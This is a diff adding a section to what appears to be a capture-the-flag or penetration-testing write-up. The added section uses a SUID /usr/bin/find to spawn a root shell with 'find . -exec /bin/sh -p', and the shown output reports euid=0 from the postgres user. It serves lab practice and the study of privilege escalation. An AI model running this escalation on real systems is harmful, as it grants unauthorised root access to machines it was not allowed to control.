@@ -2522,6 +2522,15 @@ bash-5.1# cat proof.txt
 cat proof.txt
 3a7df0bf25481b398003f325d6250ba7
 ````
+#### /usr/bin/find
+````
+find . -exec /bin/sh -p \; -quit
+````
+````
+# id
+id
+uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
+````
 #### /usr/bin/dosbox
 ````
 DOSBox version 0.74-3
